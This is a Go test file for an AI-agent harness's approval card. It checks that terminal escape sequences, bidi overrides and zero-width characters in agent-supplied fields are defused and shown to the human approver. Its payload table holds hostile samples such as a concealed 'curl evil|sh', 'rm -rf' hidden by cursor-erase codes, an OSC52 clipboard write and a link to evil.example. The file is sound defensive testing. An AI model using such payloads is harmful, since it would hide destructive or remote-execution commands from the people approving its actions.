package main

// approvals_escape_test.go — audit KA-001 / p09-001: agent-controlled text
// on the confirm-mode approval card and the goal ask dialog must not reach
// the operator's terminal as live escape sequences, and whatever the agent
// tried to hide must be VISIBLE on the decision surface.
//
// These tests only call functions that predate the fix (approvalInputLines,
// approvalCardRows, askCardRows, approvalBox), so they compile and FAIL on
// the unfixed tree — that is the mutation proof. cardText's own unit tests
// live in card_text_test.go.

import (
	"encoding/json"
	"flag"
	"os"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/charmbracelet/lipgloss"
	"github.com/muesli/termenv"
)

var updateCardGolden = flag.Bool("update-card-golden", false, "rewrite testdata/approval_card_benign.golden")

// escPayload is one hostile input class: raw is what the agent sends,
// visible is text that must show up on the card (the hidden payload or the
// visible marker of the control that tried to hide it).
type escPayload struct {
	name    string
	raw     string
	visible []string
}

var escPayloads = []escPayload{
	{"sgr-conceal", "ls -la \x1b[8m; curl evil|sh \x1b[28m",
		[]string{"ls -la ␛[8m; curl evil|sh ␛[28m"}},
	{"csi-cursor-erase", "rm -rf /x\x1b[1A\x1b[2K\x1b[Kls hidden-csi",
		[]string{"rm -rf /x␛[1A␛[2K␛[Kls hidden-csi"}},
	{"osc52-clipboard", "echo hi\x1b]52;c;Y3VybCBldmlsfHNo\x07",
		[]string{"echo hi␛]52;c;Y3VybCBldmlsfHNo␇"}},
	{"osc8-link", "\x1b]8;;https://evil.example/x\x1b\\docs\x1b]8;;\x1b\\",
		[]string{"␛]8;;https://evil.example/x␛\\docs␛]8;;␛\\"}},
	{"c1-csi", "ok\u009b8mhidden-c1\u009b28m",
		[]string{"ok<U+009B>8mhidden-c1<U+009B>28m"}},
	{"bidi", "safe\u202eevil-rlo\u202c \u2066evil-lri\u2069",
		[]string{"safe<U+202E>evil-rlo<U+202C> <U+2066>evil-lri<U+2069>"}},
	{"zero-width", "rm\u200b -rf\u200b /",
		[]string{"rm<U+200B> -rf<U+200B> /"}},
}

// escField renders a card with the payload placed in one agent-controlled
// field. Tool input goes through json.Marshal exactly like the daemon's
// InputJson: there the escape is the printable text \u001b.
type escField struct {
	name   string
	render func(m Model, p string) string
}

func jsonIn(t *testing.T, v map[string]any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func escCard(m Model, a approvalItem) string {
	a.group, a.id = "alpha", "ap1"
	m.approvals = map[string]approvalItem{a.key(): a}
	return approvalBox(m.approvalCardRows(a, 76, 1<<20), 80)
}

func escFields(t *testing.T) []escField {
	tool := func(name string, in map[string]any) func(Model, string) string {
		return func(m Model, p string) string {
			v := map[string]any{}
			for k, x := range in {
				if x == "$P" {
					x = p
				}
				v[k] = x
			}
			return escCard(m, approvalItem{tool: name, input: jsonIn(t, v), summary: "read-only listing"})
		}
	}
	return []escField{
		{"command", tool("Bash", map[string]any{"command": "$P"})},
		{"description", tool("Bash", map[string]any{"command": "true", "description": "$P"})},
		{"file_path", tool("Edit", map[string]any{"file_path": "$P", "old_string": "a", "new_string": "b"})},
		{"old_string", tool("Edit", map[string]any{"file_path": "/w/a", "old_string": "$P", "new_string": "b"})},
		{"new_string", tool("Edit", map[string]any{"file_path": "/w/a", "old_string": "a", "new_string": "$P"})},
		{"multiedit", func(m Model, p string) string {
			in := jsonIn(t, map[string]any{"file_path": "/w/a", "edits": []any{
				map[string]any{"old_string": p, "new_string": p}}})
			return escCard(m, approvalItem{tool: "MultiEdit", input: in})
		}},
		{"content", tool("Write", map[string]any{"file_path": "/w/a", "content": "$P"})},
		{"generic-value", tool("mcp__srv__do", map[string]any{"arg": "$P"})},
		{"generic-nested", tool("mcp__srv__do", map[string]any{"arg": []any{"$P"}})},
		{"generic-key", func(m Model, p string) string {
			return escCard(m, approvalItem{tool: "mcp__srv__do", input: jsonIn(t, map[string]any{p: "v"})})
		}},
		{"fallback", func(m Model, p string) string {
			return escCard(m, approvalItem{tool: "Bash", input: "not json " + p})
		}},
		{"summary", func(m Model, p string) string {
			return escCard(m, approvalItem{tool: "Bash", input: `{"command":"true"}`, summary: p})
		}},
		{"tool-name", func(m Model, p string) string {
			return escCard(m, approvalItem{tool: p, input: `{"command":"true"}`})
		}},
		{"ask-question", func(m Model, p string) string {
			return escCard(m, approvalItem{kind: kindAsk, summary: p, options: []string{"yes"}})
		}},
		{"ask-option", func(m Model, p string) string {
			return escCard(m, approvalItem{kind: kindAsk, summary: "which?", options: []string{"yes", p}})
		}},
	}
}

// asciiProfile turns lipgloss styling off so that any ESC left in the
// rendered card can only have come from the agent's text.
func asciiProfile(t *testing.T) {
	t.Helper()
	prev := lipgloss.ColorProfile()
	lipgloss.SetColorProfile(termenv.Ascii)
	t.Cleanup(func() { lipgloss.SetColorProfile(prev) })
}

// hostileRune reports a byte/rune that must never reach the terminal from a
// card: ESC, any other C0 but \n, DEL, C1, bidi/format and zero-width runes.
func hostileRune(r rune) bool {
	return (r < 0x20 && r != '\n') || (r >= 0x7f && r <= 0x9f) || isHostileFormat(r)
}

func TestApprovalCardEscapesEveryField(t *testing.T) {
	asciiProfile(t)
	m := newModel("", 200000)
	for _, f := range escFields(t) {
		for _, p := range escPayloads {
			t.Run(f.name+"/"+p.name, func(t *testing.T) {
				card := f.render(m, p.raw)
				if i := strings.IndexByte(card, 0x1b); i >= 0 {
					t.Errorf("raw ESC (0x1b) at byte %d reaches the terminal:\n%q", i, card)
				}
				if i := bareC1(card); i >= 0 {
					t.Errorf("C1 CSI (U+009B or a stray 0x9b byte) at byte %d reaches the terminal:\n%q", i, card)
				}
				for _, r := range card {
					if hostileRune(r) {
						t.Errorf("hostile rune U+%04X reaches the terminal:\n%q", r, card)
						break
					}
				}
				flat := strings.ReplaceAll(unwrapCard(card), " ", "")
				for _, want := range p.visible {
					if !strings.Contains(flat, strings.ReplaceAll(want, " ", "")) {
						t.Errorf("hidden payload not visible: want %q in\n%s", want, card)
					}
				}
				assertFits(t, card, 80)
			})
		}
	}
}

// unwrapCard joins a boxed card's inner rows back into one string (border
// and padding stripped, wrap points removed) so a payload wrapped across
// rows can be matched as one piece.
func unwrapCard(card string) string {
	var b strings.Builder
	for _, l := range strings.Split(card, "\n") {
		rs := []rune(l)
		if len(rs) < 4 {
			continue
		}
		b.WriteString(strings.TrimRight(string(rs[2:len(rs)-2]), " "))
	}
	return b.String()
}

// The whole path, as the operator gets it: a hostile Bash request arrives on
// the stream, the inline card opens, and the frame the TUI hands to the
// terminal shows the concealed curl with a visible ␛ and holds no live
// conceal / cursor / OSC sequence.
func TestApprovalCardEscapesEndToEnd(t *testing.T) {
	asciiProfile(t)
	m := typing(t, "")
	in := jsonIn(t, map[string]any{"command": "ls -la \x1b[8m; curl evil|sh \x1b[28m\x1b[1A\x1b[2K\x1b]52;c;eA==\x07"})
	m = apFeed(t, m, Event{Event: "approval_request", Group: "alpha", Session: "", ID: "ap1",
		Name: "Bash", Input: in, Text: "read-only\u202e listing"})
	if !m.approvalCard.open {
		t.Fatalf("card not open: %+v", m.approvalCard)
	}
	view := m.View()
	for _, bad := range []string{"\x1b[8m", "\x1b[28m", "\x1b[1A", "\x1b[2K", "\x1b]52", "\u202e"} {
		if strings.Contains(view, bad) {
			t.Errorf("view carries %q:\n%q", bad, view)
		}
	}
	if !strings.Contains(view, "curl evil|sh") || !strings.Contains(view, "␛[8m") || !strings.Contains(view, "<U+202E>") {
		t.Errorf("hidden payload not visible in view:\n%s", view)
	}
	assertFits(t, view, 40)
}

// A benign card is byte-for-byte what it was before the fix. The golden was
// written by the UNFIXED tree (origin/develop c386c99) with
// -update-card-golden and is only compared here.
func TestApprovalCardBenignGolden(t *testing.T) {
	asciiProfile(t)
	m := newModel("", 200000)
	var b strings.Builder
	for _, a := range []approvalItem{
		{tool: "Bash", input: `{"command":"ls -la /workspace\tx","description":"list files"}`, summary: "List the workspace"},
		{tool: "Edit", input: editInput, summary: "Edit /workspace/a.go"},
		{tool: "MultiEdit", input: `{"file_path":"/w/a.go","edits":[{"old_string":"a\nb","new_string":"c"}]}`},
		{tool: "Write", input: `{"file_path":"/w/b.go","content":"package main\n\nfunc main() {}\n"}`},
		{tool: "mcp__srv__do", input: `{"zeta":"z","alpha":{"n":1},"emoji":"👩‍💻 ｶﾞ 日本語 – “q”"}`},
		{tool: "Bash", input: "not json at all"},
		{kind: kindAsk, summary: "which database should the migration target?", options: []string{"postgres", "sqlite"}},
	} {
		b.WriteString(escCard(m, a))
		b.WriteString("\n----\n")
	}
	got := b.String()
	const path = "testdata/approval_card_benign.golden"
	if *updateCardGolden {
		if err := os.WriteFile(path, []byte(got), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if got != string(want) {
		t.Errorf("benign card changed:\n--- got\n%s\n--- want\n%s", got, want)
	}
}

// TestApprovalCardEscapeFrame prints the hostile card with every ESC shown
// as ␛ (-v), for the PR's before/after frames. It asserts nothing.
func TestApprovalCardEscapeFrame(t *testing.T) {
	asciiProfile(t)
	m := newModel("", 200000)
	in := jsonIn(t, map[string]any{"command": "ls -la \x1b[8m; curl evil|sh \x1b[28m"})
	card := escCard(m, approvalItem{tool: "Bash", input: in, summary: "read-only listing"})
	t.Logf("FRAME\n%s", strings.ReplaceAll(card, "\x1b", "␛"))
}

// bareC1 returns the byte offset of a C1 CSI that would reach the terminal:
// the rune U+009B, or a lone 0x9b byte that is not part of a valid UTF-8
// sequence. A plain IndexByte(0x9b) is wrong here because the visible
// placeholder ␛ (U+241B) itself encodes as E2 90 9B.
func bareC1(s string) int {
	for i := 0; i < len(s); {
		r, n := utf8.DecodeRuneInString(s[i:])
		if r == 0x9b || (r == utf8.RuneError && n == 1 && s[i] == 0x9b) {
			return i
		}
		i += n
	}
	return -1
}
